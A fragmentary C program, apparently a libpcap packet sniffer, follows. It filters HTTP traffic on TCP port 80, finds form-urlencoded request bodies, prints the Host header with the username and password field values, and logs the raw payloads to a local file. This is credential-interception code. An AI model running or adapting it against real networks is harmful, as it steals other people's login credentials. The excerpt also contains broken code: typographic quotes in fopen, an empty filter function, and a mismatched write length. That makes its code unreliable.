...
char *pattern = "application/x-www-form-urlencoded;";
char *username = "username";
char *password = "password";
char *end = "\n";
char *separator = "&";
char *host = "Host";
//char pattern[9]="username";
...
struct packet_tcp {
 ...
 int fliter(unsigned char* temp)
{
     int i;
     //for(i=0;i)
} 
 
int mywrite(const u_char *p, int len ){
    FILE *fp;
    fp = fopen(“./log.txt“,”a”);
    fwrite(p, len, 1, fp );
    fwrite("\n\n", 4, 1, fp );
...
void loop_callback(u_char *args, const struct pcap_pkthdr *header, const u_char *packet) {
    ...
    if(strstr((char *)payload,pattern))
    {
    	//int i;  
       ...
       // 	printf("%c", payload[i]);  
        ...
        //    printf("\n");  
    	//}  
    	mywrite(payload, size_payload);

	char *p = strstr((char *)payload,host);
	char *p1 = strstr(p,end);
	printf("%.*s\n", p1-p, p);
	
	if(strstr(p,username)){
        	p = strstr(p,username);
        	p1 = strstr(p,separator);
       		printf("%.*s\n", p1-p, p);
    	
		p = strstr(p1,password);
		p1 = strstr(p,separator);
		printf("%.*s\n", p1-p, p);
        }
	//printf("%s",strstr((char *)payload,pattern));
    	//printf("\n");
     }    
     } else {
...
int main(int argc, char *argv[]) {
    ...
    char filter_app[] = "tcp port 80 and (((ip[2:2] - ((ip[0]&0xf)<<2)) - ((tcp[12]&0xf0)>>2)) != 0)"; /* 过滤表达式 */
